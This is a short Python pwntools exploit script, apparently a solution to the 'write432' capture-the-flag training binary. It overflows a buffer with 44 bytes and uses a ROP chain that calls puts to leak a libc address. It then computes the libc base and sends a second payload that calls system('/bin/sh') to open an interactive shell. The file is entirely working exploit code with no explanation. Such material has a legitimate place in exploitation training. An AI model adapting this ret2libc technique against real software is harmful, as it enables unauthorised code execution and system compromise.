from pwn import *
target=process('./write432')
elf=ELF('write432')
libc=elf.libc
print(target.recvuntil("already!\n> "))
payload="A"*44

puts_plt=0x08048420
puts_got=0x0804a014
pwnme=0x080485f6
popret=0x080486db

payload+=p32(puts_plt)
payload+=p32(popret)
payload+=p32(puts_got)
payload+=p32(pwnme)
payload+=p32(0x0)

target.sendline(payload)
leak=target.recv()[0:4]
#leak=target.recvuntil("\x0a").strip("\x0a")
libc_puts=u32(leak+"\x00"*(4-len(leak)))
libc_base=libc_puts-libc.symbols["puts"]
print(hex(libc_base))
libc_system=libc_base+libc.symbols["system"]
libc_binsh=libc_base+libc.search("/bin/sh\x00").next()

payload="A"*44

payload+=p32(libc_system)
payload+=p32(0xdeadbeef)
payload+=p32(libc_binsh)

target.sendline(payload)
target.interactive()

